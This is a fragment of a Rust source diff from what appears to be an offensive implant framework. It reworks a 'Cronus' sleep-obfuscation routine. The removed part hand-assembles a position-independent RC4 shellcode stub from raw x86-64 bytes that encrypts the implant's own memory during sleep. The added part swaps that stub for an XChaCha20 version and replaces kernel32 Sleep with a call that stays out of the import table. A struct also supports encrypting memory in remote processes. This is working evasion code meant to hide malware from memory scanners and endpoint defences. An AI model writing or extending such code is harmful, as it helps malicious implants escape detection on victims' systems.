-    code.extend_from_slice(&[0x0F, 0xB6, 0x3C, 0x33]);
-    code.extend_from_slice(&[0x43, 0x0F, 0xB6, 0x04, 0x3B]);
-    code.extend_from_slice(&[0x88, 0x04, 0x33]);
-    code.extend_from_slice(&[0x41, 0x88, 0x3C, 0x3B]);
-
-    code.extend_from_slice(&[0x40, 0x00, 0xF8]);
-    code.extend_from_slice(&[0x0F, 0xB6, 0xC0]);
-    code.extend_from_slice(&[0x0F, 0xB6, 0x04, 0x03]);
-
-    code.extend_from_slice(&[0x41, 0x30, 0x04, 0x0C]);
-    code.extend_from_slice(&[0x48, 0xFF, 0xC1]);
-
-    let loop_back = code.len();
-    let rel32 = loop_off as i32 - (loop_back as i32 + 5);
-    code.push(0xE9);
-    code.extend_from_slice(&rel32.to_le_bytes());
-
-    let done_off = code.len();
-    code.extend_from_slice(&[0x31, 0xC0]);
-    code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x08]);
-    code.extend_from_slice(&[0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B]);
-    code.push(0xC3);
-
-    let sbox_disp = 0i32 - (0x200 + lea_sbox_pos as i32 + 7);
-    code[lea_sbox_pos + 3..lea_sbox_pos + 7].copy_from_slice(&sbox_disp.to_le_bytes());
-    let key_disp = 0x100i32 - (0x200 + lea_key_pos as i32 + 7);
-    code[lea_key_pos + 3..lea_key_pos + 7].copy_from_slice(&key_disp.to_le_bytes());
-    let jge_rel = done_off as i32 - (jge_done_pos as i32 + 6);
-    code[jge_done_pos + 2..jge_done_pos + 6].copy_from_slice(&jge_rel.to_le_bytes());
-
-    let code_start = 0x200;
-    if code.len() + code_start > stub_size {
-        cronus_free_stub(stub_addr as usize, stub_size);
-        return Err(anyhow!("Cronus RC4 stub code too large"));
-    }
-    std::ptr::copy_nonoverlapping(code.as_ptr(), base.add(code_start), code.len());
-
-    winapi::um::processthreadsapi::FlushInstructionBuffers(
-        winapi::um::processthreadsapi::GetCurrentProcess(),
-        stub_addr,
-        code.len(),
-    );
-
-    Ok((stub_addr as usize, stub_size))
-}
-
-/// Execute the position-independent RC4 stub to encrypt/decrypt a memory
-/// region.
+/// Execute the position-independent XChaCha20 stub to encrypt/decrypt a memory
+/// region via the provided function pointer.
 ///
 /// # Safety
 ///
-/// The stub must have been built by `cronus_build_rc4_stub` and the target
-/// region must be writable.
-unsafe fn cronus_exec_rc4_stub(stub_addr: usize, target_base: usize, target_size: usize) {
+/// The stub must have been built by `cronus_build_xchacha20_stub` and the
+/// target region must be writable.  `fn_ptr` must point to a valid function
+/// that accepts (base_addr: usize, size: usize) and performs the cipher
+/// operation in-place.
+unsafe fn cronus_exec_xchacha20_stub(
+    stub_addr: usize,
+    target_base: usize,
+    target_size: usize,
+    fn_ptr: unsafe extern "system" fn(usize, usize) -> i32,
+) {
     if stub_addr == 0 || target_base == 0 || target_size == 0 {
         return;
     }
-    let stub_fn: unsafe extern "system" fn(usize, usize) -> i32 =
-        std::mem::transmute((stub_addr + 0x200) as *const ());
-    stub_fn(target_base, target_size);
+    let stub_fn: unsafe extern "system" fn(usize, usize, usize) -> i32 =
+        std::mem::transmute(stub_addr as *const ());
+    stub_fn(target_base, target_size, fn_ptr as usize);
 }
 
 // ── Core sleep function ──────────────────────────────────────────────────────
@@ -1870,10 +1667,10 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
                                 let mut delay_100ns = duration_to_100ns(duration);
                                 nt_delay(0, &mut delay_100ns);
                             } else {
-                                winapi::um::synchapi::Sleep(duration.as_millis() as u32);
+                                sleep_no_iat(duration);
                             }
                         } else {
-                            winapi::um::synchapi::Sleep(duration.as_millis() as u32);
+                            sleep_no_iat(duration);
                         }
                     }
                 }
@@ -1893,10 +1690,10 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
                         let mut delay_100ns = duration_to_100ns(duration);
                         nt_delay(0, &mut delay_100ns);
                     } else {
-                        winapi::um::synchapi::Sleep(duration.as_millis() as u32);
+                        sleep_no_iat(duration);
                     }
                 } else {
-                    winapi::um::synchapi::Sleep(duration.as_millis() as u32);
+                    sleep_no_iat(duration);
                 }
             }
         }
@@ -1912,11 +1709,11 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
                     let mut delay_100ns = duration_to_100ns(duration);
                     nt_delay(0, &mut delay_100ns);
                 } else {
-                    // Fallback to kernel32 Sleep.
-                    winapi::um::synchapi::Sleep(duration.as_millis() as u32);
+                    // Fallback sleep (no IAT).
+                    sleep_no_iat(duration);
                 }
             } else {
-                winapi::um::synchapi::Sleep(duration.as_millis() as u32);
+                sleep_no_iat(duration);
             }
         }
     }
@@ -2087,7 +1884,7 @@ struct RemoteProcess {
     /// Optional waitable-timer handle used by Cronus variant for remote
     /// process sleep encryption.  `0` means no timer is allocated.
     timer_handle: usize,
-    /// Optional pointer to the Cronus position-independent RC4 encryption
+    /// Optional pointer to the Cronus position-independent XChaCha20 encryption
     /// stub allocated in this process.  `0` means no stub allocated.
     cronos_stub_addr: usize,
     /// Size of the Cronus stub in bytes.
